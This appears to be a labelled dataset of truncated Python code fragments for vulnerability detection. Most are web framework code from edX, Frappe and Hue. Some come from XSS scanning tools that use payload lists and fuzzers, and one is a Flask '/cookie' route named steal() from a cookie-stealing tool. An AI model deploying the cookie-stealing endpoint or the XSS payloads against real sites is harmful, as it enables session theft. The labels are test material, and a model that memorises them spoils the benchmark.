url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'),", "label": 0}, {"snippet_id": 48052, "code": " category: str, text: str, file): m: Media=Media() upload_base_path: str='uploads/' +str(date.today().year) high_res_file_name=upload_base_path +'/HIGHRES_' +ntpath.basename(file.name.replace(\" \", \"_\")", "label": 0}, {"snippet_id": 30199, "code": " % action] \tfunct.ssh_command(serv, commands)\t\t \t if act==\"overview\": \tovw.get_overview() \t if act==\"overviewwaf\": \tovw.get_overviewWaf(form.getvalue('page')) \t if act==\"overviewServers\": \tovw.get_overviewServers", "label": 0}, {"snippet_id": 42184, "code": "(d[fieldname]).strip()==\"\": \t\t\t\t\t \t\t\t\t\td[fieldname]=None \t\t\t\tif isinstance(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif", "label": 0}, {"snippet_id": 1605, "code": " if data['scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid)", "label": 0}, {"snippet_id": 28773, "code": " import SSHClient \timport sql \tfullpath=get_config_var('main', 'fullpath') \tssh_enable='' \tssh_port='' \tssh_user_name='' \tssh_user_password='' \t \tfor sshs in sql.select_ssh(serv=serv): \t\tssh_enable=sshs[3]", "label": 0}, {"snippet_id": 14962, "code": " expected_verbosity_string) def test_invalid_verbosity_and_processes(self): \"\"\" If an invalid combination of verbosity and number of processors is passed in, a BuildFailure should be raised \"\"\" suite=BokChoyTestSuite('',", "label": 0}, {"snippet_id": 2438, "code": "='Payloads/xss.txt' with open(path) as f: for line in f: if line: payload_list.append(line.rstrip()) return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type", "label": 0}, {"snippet_id": 39237, "code": "\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t", "label": 0}, {"snippet_id": 28833, "code": " \t\telse: \t\t\tssh.connect(hostname=serv, port= ssh_port, username=ssh_user_name, password=ssh_user_password) \t\treturn ssh \texcept paramiko.AuthenticationException: \t\treturn 'Authentication failed, please", "label": 0}, {"snippet_id": 22848, "code": "/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]", "label": 1}, {"snippet_id": 39125, "code": "\tself.__dict__[key]=None \t\t\tif key in(\"idx\", \"docstatus\") and self.__dict__[key] is None: \t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__", "label": 0}, {"snippet_id": 26299, "code": " country_code, normalized_id, company_name=result self.instance.vat_id_validated=True self.instance.vat_id=normalized_id except(vat_moss.errors.InvalidError, ValueError): raise ValidationError(_('This VAT ID is", "label": 0}, {"snippet_id": 26346, "code": ".request, _('Your VAT ID could not be checked, as the VAT checking service of ' 'your country is currently not available. We will therefore ' 'need to charge VAT on your invoice. You can get the tax amount", "label": 0}, {"snippet_id": 33485, "code": ".website.render import clear_cache from frappe.utils import today, cint, global_date_format, get_fullname, strip_html_tags, markdown from frappe.website.utils import find_first_image, get_comment_list class", "label": 1}, {"snippet_id": 4471, "code": " 'x': '\\u0445', 'y': '\\u0443', } def __init__(self): super(Code, self).__init__() @staticmethod def fuzzAscii(): for i in xrange(256): yield chr(i) @staticmethod def fuzzUnicode(cnt=1): for i in xrange", "label": 0}, {"snippet_id": 50084, "code": " request): \"callback if a request is lost/timed out\" try: del self.requests[csessid] except KeyError: pass def _keepalive(self): \"\"\" Callback for checking the connection is still alive. \"\"\" now=time.time(", "label": 0}, {"snippet_id": 19065, "code": "(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings", "label": 0}, {"snippet_id": 35746, "code": ".fieldtype][0] or None \t\t\tdefault_column_max_length=type_map[df.fieldtype][1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length", "label": 0}, {"snippet_id": 54450, "code": "\\nGithub: https://github.com/AlaBouali\\nE-mail: trap.leader.123@gmail.com\\n\\nDisclaimer:\\nThis tool is for educational purposes only!!!\\n\\n\\n\", background='light sky blue').grid(row=12,column=1) mainloop()", "label": 0}, {"snippet_id": 45272, "code": "=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user) Document.objects.link(coordinator_doc, owner=coordinator_doc.owner, name=coordinator_doc.name, description=coordinator_doc.description", "label": 0}, {"snippet_id": 21962, "code": "='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get", "label": 0}, {"snippet_id": 11065, "code": " courses in them. For example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}", "label": 0}, {"snippet_id": 8663, "code": " name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if", "label": 0}, {"snippet_id": 17760, "code": "]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete", "label": 0}, {"snippet_id": 26890, "code": "+] XSS check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for xss in xss_attacks: post_params={} counter+=1 parameters=\"\" for i in range", "label": 0}, {"snippet_id": 41200, "code": "=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title", "label": 1}, {"snippet_id": 36688, "code": "')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not cint(self.published): \t\t\traise Exception(\"This blog has", "label": 0}, {"snippet_id": 52800, "code": " submission form: %s' % params_form.errors)) else: parameters=workflow.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param['value']) for param in parameters]", "label": 0}, {"snippet_id": 19073, "code": ".hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view", "label": 0}, {"snippet_id": 35981, "code": " self.docstatus==2 \t\t\t\t\t\tor(self.docstatus==1 and not df.get(\"allow_on_submit\"))): \t\t\t\tcontinue \t\t\telse: \t\t\t\tsanitized_value=sanitize_html(value, linkify=df.fieldtype=='Text Editor') \t\t\tself.set(fieldname,", "label": 0}, {"snippet_id": 40223, "code": "\t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content(self): \t\t\"\"\"Sanitize HTML and Email in field values. Used to prevent XSS. \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code'", "label": 0}, {"snippet_id": 35666, "code": ")] \t\tif constants: \t\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df", "label": 0}, {"snippet_id": 49564, "code": "+values class SmartList(object): def __init__(self, object_list, query_params=None, list_display=None, list_filter=None, list_search=None, search_query_param=None, ordering_query_param=None): self.object_list", "label": 0}, {"snippet_id": 18685, "code": ".peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes", "label": 0}, {"snippet_id": 39251, "code": "\"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc \tdef as_json(self): \t\treturn frappe.as_json(self.as_dict()) \tdef get_table_field_doctype(self, fieldname): \t\treturn self", "label": 0}, {"snippet_id": 33429, "code": ")|i|(\\%49))((\\%6D)|m|(\\%4D))((\\%67)|g|(\\%47))[^\\n]+((\\%3E)|>)\") \t\t\tif any(x in _payload for x in \"\\\"'><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types", "label": 1}, {"snippet_id": 43122, "code": "\t\tvalues=frappe.db.get_value(self.doctype, self.name, constants, as_dict=True) \t\tfor fieldname in constants: \t\t\tdf=self.meta.get_field(fieldname) \t\t\t \t\t\tif df.fieldtype=='Date' or df.fieldtype=='Datetime", "label": 0}, {"snippet_id": 53906, "code": ")+'Coded By: Khaled Nassar @knassar702\\n\\n') sleep(2) app=Flask(__name__) @app.route('/') def index(): \treturn 'Hello ^_^' @app.route('/cookie',methods=['GET','POST']) def steal(): \tif request.method==", "label": 1}, {"snippet_id": 29947, "code": "(ssh_keys, \"w\") as conf: \t\t\tconf.write(form.getvalue('ssh_cert')) \texcept IOError: \t\tprint('<div class=\"alert alert-danger\">Can\\'t save ssh keys file. Check ssh keys path in config</div>') \telse: \t\tprint", "label": 0}, {"snippet_id": 24989, "code": "'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url=\"/api/courses/v1/blocks/?{}\"", "label": 0}, {"snippet_id": 48923, "code": "=getattr(self.object, self.column.field_name) if self.column.field_name else None if type(self.object)==dict: value=self.object.get(self.column.field_name) elif callable(field): value=field() if getattr", "label": 1}, {"snippet_id": 53410, "code": " edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get('id'): bundle_doc", "label": 0}, {"snippet_id": 30103, "code": ".py \t if form.getvalue('backend') is not None: \tfunct.show_backends(serv) \t if form.getvalue('ip') is not None and serv is not None: \tcommands=[ \"sudo ip a |grep inet |egrep -v '::1' |awk '{ print $2 }'", "label": 0}, {"snippet_id": 4745, "code": "'onplaying', 'onpopstate', 'onprogress', 'onratechange', 'onreset', 'onresize', 'onscroll', 'onsearch', 'onseeked', 'onseeking', 'onselect', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage", "label": 0}, {"snippet_id": 21120, "code": ">[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id", "label": 0}, {"snippet_id": 7142, "code": ".urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\",", "label": 0}, {"snippet_id": 23870, "code": "(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite", "label": 0}, {"snippet_id": 28394, "code": ": text/html\\n') \t\tprint('<center><div class=\"alert alert-danger\">Check the config file. Presence section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime", "label": 0}, {"snippet_id": 32385, "code": " KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown() if thread: thread.join() return retcode def _open_url(url): time.sleep(1) webbrowser.open(url)", "label": 0}, {"snippet_id": 15578, "code": ".format(Env.REPO_ROOT)) if not self.fasttest: self.generate_optimized_static_assets() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming", "label": 0}, {"snippet_id": 10428, "code": ".verbosity_processes_string(suite) class TestPaverPa11yCrawlerCmd(unittest.TestCase): \"\"\" Paver pa11ycrawler command test cases. Most of the functionality is inherited from BokChoyTestSuite, so those tests", "label": 0}, {"snippet_id": 50234, "code": " self.requests[csessid].finish() del self.requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client requests", "label": 0}, {"snippet_id": 28695, "code": "\timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 \t\tpass", "label": 0}, {"snippet_id": 45371, "code": " @check_document_access_permission() def submit_coordinator(request, doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=", "label": 0}, {"snippet_id": 33452, "code": " parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re.escape(sig), response) \t\t\t\tif match and any(x in payload for x in \"><\"", "label": 1}, {"snippet_id": 40490, "code": " self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key]: \t\t\tself._precision[cache_key][fieldname]=None \t\t\tdoctype=self.meta.get_field(parentfield", "label": 0}, {"snippet_id": 44750, "code": "], _property['value']) for _property in properties])) if copied_properties: _properties.update(copied_properties) response['status']=0 response['properties']=_properties response['name']='%s-%s' %(node", "label": 0}, {"snippet_id": 42415, "code": "\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry: \t\t\tfrappe", "label": 0}, {"snippet_id": 51285, "code": ".html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'enable_logins", "label": 0}, {"snippet_id": 54657, "code": " def get_success_url(self): return reverse('article-detail', kwargs={'pk': self.object.pk}) def get_context_data(self, **kwargs): context=super().get_context_data(**kwargs) context['comments']=self.object", "label": 0}, {"snippet_id": 22160, "code": "', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$", "label": 0}, {"snippet_id": 1647, "code": "['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to parse\" print \"Data\",data try: if data['id']==\"NA\": all_data={'url': data", "label": 0}, {"snippet_id": 17376, "code": "'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid", "label": 0}, {"snippet_id": 44517, "code": "') if len(jobs) > 1 else _('Workflow copied.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_modify_permission() def save_workflow(request): response={'status'", "label": 0}, {"snippet_id": 48552, "code": " request.GET.get(\"redirect\"): forward_url=request.GET[\"redirect\"] if \"srid\" in request.GET: if not request.GET.get(\"rid\"): return HttpResponseRedirect(\"/admin?error=missing%20primary%20reservation%20id", "label": 0}, {"snippet_id": 11999, "code": "[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name", "label": 0}, {"snippet_id": 45375, "code": ", doc_id): coordinator=Coordinator(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST", "label": 0}, {"snippet_id": 4632, "code": "', 'noscript', 'object', 'ol', 'optgroup', 'option', 'output', 'p', 'param', 'picture', 'pre', 'progress', 'q', 'rp', 'rt', 'rtc', 'ruby', 's', 'samp', 'script', 'section', 'select', 'shadow', 'small',", "label": 0}, {"snippet_id": 33607, "code": "\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext", "label": 0}, {"snippet_id": 25769, "code": " initial else None, ) elif q.type==Question.TYPE_CHOICE: field=forms.ModelChoiceField( queryset=q.options, label=q.question, required=q.required, help_text=help_text, widget=forms.Select, empty_label='", "label": 0}, {"snippet_id": 36651, "code": ".blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published and not self.published_on", "label": 0}, {"snippet_id": 24787, "code": "\"DEFAULT_STORE={default_store}\" \"./manage.py lms --settings bok_choy loaddata --traceback\" \" common/test/db_fixtures/*.json\".format( default_store=self.default_store, ) ) def run_servers_continuously(self): \"\"\"", "label": 0}, {"snippet_id": 17083, "code": "/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups", "label": 0}, {"snippet_id": 32596, "code": ".path.exists(full_path +'/README.md'): self._DoMD(path +'/README.md') elif path.lower().endswith('.png'): self._DoImage(full_path, 'image/png') elif path.lower().endswith('.jpg'): self._DoImage(full_path,", "label": 0}, {"snippet_id": 27960, "code": "'upload_key') if not upload_key: return None blob_info=storage.GcsBlobInfo.from_key(upload_key) if not blob_info: raise helpers.EarlyExitException('Failed to upload.', 500) self.upload=blob_info return", "label": 0}, {"snippet_id": 30019, "code": ">Please enter desired name</div>') \telse: \t\tname=form.getvalue('ssl_name') +'.pem' \t \ttry: \t\twith open(name, \"w\") as ssl_cert: \t\t\tssl_cert.write(form.getvalue('ssl_cert')) \texcept IOError: \t\tprint('<div", "label": 0}, {"snippet_id": 39348, "code": " columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t", "label": 0}, {"snippet_id": 51900, "code": ":6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT=['pickle'] CELERY_TASK_SERIALIZER='pickle' CELERY_RESULT_SERIALIZER='pickle' CELERY_TIMEZONE='UTC' CELERY_BEAT_SCHEDULER='django_celery_beat.schedulers:DatabaseScheduler", "label": 0}, {"snippet_id": 34795, "code": " not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType", "label": 0}, {"snippet_id": 53213, "code": " else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters() initial_params=ParameterForm.get_initial_params(dict([(param['name'], param", "label": 0}, {"snippet_id": 10894, "code": "' except FixtureError: pass if self.serversonly: self.run_servers_continuously() def __exit__(self, exc_type, exc_value, traceback): super(BokChoyTestSuite, self).__exit__(exc_type, exc_value, traceback", "label": 0}, {"snippet_id": 32305, "code": "!=80: origin +=':%s' % args.port print('Listening on %s/' % origin) thread=None if args.file: path=os.path.realpath(args.file) if not path.startswith(top_level): print('%s is not under %s' %(args.file,", "label": 0}, {"snippet_id": 15994, "code": "): \"\"\" Runs pa11ycrawler as staff user against the test course. \"\"\" cmd_str=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir", "label": 0}, {"snippet_id": 11038, "code": "', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir", "label": 0}, {"snippet_id": 19754, "code": " log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various set-up", "label": 0}, {"snippet_id": 1767, "code": "\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0.0.0", "label": 0}, {"snippet_id": 27379, "code": " dict_obj=obj.to_dict() dict_obj['id']=obj.key.id() return dict_obj elif isinstance(obj, datetime.datetime): return int((obj -self._EPOCH).total_seconds()) elif hasattr(obj, 'to_dict'): return obj.to_dict(", "label": 0}, {"snippet_id": 2810, "code": " headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url+'/?test=", "label": 0}, {"snippet_id": 33442, "code": "><;/\"): \t\t\t\treturn _payload \tdef check(self, url, payload, response, parameter): \t\tfor injection_types in self.signatures.keys(): \t\t\tfor sig in self.signatures[injection_types]: \t\t\t\tmatch=re.findall(re", "label": 1}, {"snippet_id": 29576, "code": "\tshow_log(stdout) \t\telif kwargs.get(\"server_status\")==\"1\": \t\t\tserver_status(stdout) \t\telif kwargs.get('print_out'): \t\t\tprint(stdout.read().decode(encoding='UTF-8')) \t\t\treturn stdout.read().decode(encoding", "label": 0}, {"snippet_id": 28989, "code": " IOError: \t\tprint('<center><div class=\"alert alert-danger\">Can\\'t read write change to log. %s</div></center>' % stderr) \t\tpass \t\t def install_haproxy(serv, **kwargs): \timport sql \tscript=\"install_haproxy.sh\"", "label": 0}, {"snippet_id": 35840, "code": " df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key", "label": 0}, {"snippet_id": 21425, "code": "<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>", "label": 0}, {"snippet_id": 32459, "code": " used as a replacement character for spaces in the title, typically set to '-'. Since we emulate Gitiles' way of slugification here, it makes little sense to have the separator charactor configurable. \"", "label": 0}, {"snippet_id": 47693, "code": ".add_content(PlainText(get_csrf_form_element(http_request))) f.add_content(SubmitButton()) a='<div class=\"w3-row w3-padding-64 w3-twothird w3-container admin-popup\">' a +=f.render_html(http_request) a +=", "label": 0}, {"snippet_id": 41585, "code": " load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password _classes={}", "label": 0}, {"snippet_id": 48911, "code": " def get_value(self): if self.column.render_function: return self.column.render_function(self.object) field=getattr(self.object, self.column.field_name) if self.column.field_name else None if type(self", "label": 1}, {"snippet_id": 12266, "code": "<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(", "label": 1}, {"snippet_id": 53569, "code": "=ParametersFormSet(initial=initial_params) popup=render('editor/submit_job_popup.mako', request,{ 'params_form': params_form, 'action': reverse('oozie:editor_submit_bundle', kwargs={'doc_id': bundle.id", "label": 0}, {"snippet_id": 39017, "code": " \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int", "label": 0}, {"snippet_id": 12373, "code": ", name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$", "label": 0}, {"snippet_id": 35320, "code": "\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid links and also updates fetch values", "label": 0}, {"snippet_id": 21000, "code": " in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"", "label": 0}, {"snippet_id": 42586, "code": " \"unique_\" in fieldname: \t\t\tfieldname=fieldname.split(\"_\", 1)[1] \t\tdf=self.meta.get_field(fieldname) \t\tif df: \t\t\tlabel=df.label \t\tfrappe.msgprint(_(\"{0} must be unique\".format(label or fieldname))) \t\t ", "label": 0}, {"snippet_id": 42804, "code": "\t\t\telse: \t\t\t\treturn \"{}:{}\".format(_(df.label), docname) \t\tinvalid_links=[] \t\tcancelled_links=[] \t\tfor df in(self.meta.get_link_fields() \t\t\t\t+self.meta.get(\"fields\",{\"fieldtype\":('=', \"Dynamic Link\")})", "label": 0}, {"snippet_id": 15596, "code": "\"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the", "label": 0}, {"snippet_id": 18271, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook", "label": 1}, {"snippet_id": 41329, "code": ".db.sql_list(\"\"\"select route from \t\t`tabBlog Post` where ifnull(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{", "label": 0}, {"snippet_id": 6501, "code": " total time a user can access a particular SP would therefor be this value, plus the pysaml2 lifetime of the assertion. \"\"\" return self.config.getint(self.section, 'sso_session_lifetime') @property def", "label": 0}, {"snippet_id": 14399, "code": " 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/", "label": 0}, {"snippet_id": 24428, "code": ".xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False", "label": 0}, {"snippet_id": 32847, "code": "><body>I do not know how to serve %s.</body>' '</html>' % self.path) def _DoDirListing(self, full_path): self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<div class=\"doc", "label": 0}, {"snippet_id": 49585, "code": "=object_list.model self.query_params=query_params or{} self.list_display=list_display or[] self.list_filter=list_filter or[] self.list_search=list_search or[] self.search_query_value=self.query_params.get", "label": 0}, {"snippet_id": 52836, "code": "{'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow, mapping): try: submission=Submission", "label": 0}, {"snippet_id": 25121, "code": "' '--pa11ycrawler-allowed-domains={allowed_domains} ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher={dont_go_here} ' '--pa11y-reporter=\"{reporter}\" ' '--depth-limit={depth", "label": 0}, {"snippet_id": 45791, "code": " force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_bundle(request, bundle, properties): try: deployment_mapping={} coords=dict([(c.uuid, c) for", "label": 0}, {"snippet_id": 24362, "code": " cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation is that this is less than or", "label": 0}, {"snippet_id": 32375, "code": ".md')): print(' Try loading %s/README.md' % origin) retcode=1 try: s.serve_forever() except KeyboardInterrupt: retcode=130 except Exception as e: print('Exception raised: %s' % str(e)) s.shutdown() if thread", "label": 0}, {"snippet_id": 39739, "code": " for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t", "label": 0}, {"snippet_id": 47241, "code": " assert 'Record Metadata' in submenu_items assert isinstance(submenu_items['Record Metadata'], menu.MenuView) rec_uuid=str(uuid.uuid4()) Record.create({'title': 'test'}, id_=rec_uuid) db.session.commit", "label": 1}, {"snippet_id": 30327, "code": ", stats_page), auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout", "label": 0}, {"snippet_id": 23180, "code": ">[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), 